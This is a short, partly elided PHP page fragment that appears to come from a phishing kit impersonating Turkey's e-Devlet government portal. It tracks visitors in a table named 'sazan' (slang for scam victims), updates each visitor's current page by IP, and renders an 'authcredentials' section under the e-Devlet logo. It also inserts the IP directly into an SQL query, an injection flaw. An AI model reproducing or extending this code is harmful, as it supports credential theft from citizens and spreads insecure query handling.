<?php
    ...
    if($rowData->rowCount() > 0) {
        $db->query("UPDATE sazan SET now = 'Özel Sayfa' WHERE ip = '{$ip}'");
    }
    $msg;
    $data = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);
    $msg = $data['privpage'];
                            ...
                            <div id="authcredentials" style="">
                                <div class="row">
                                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                       ...
                                       <h1 style="text-align:center;"><img src="god/edevlet.png" style="width:230px;"></h1><br>
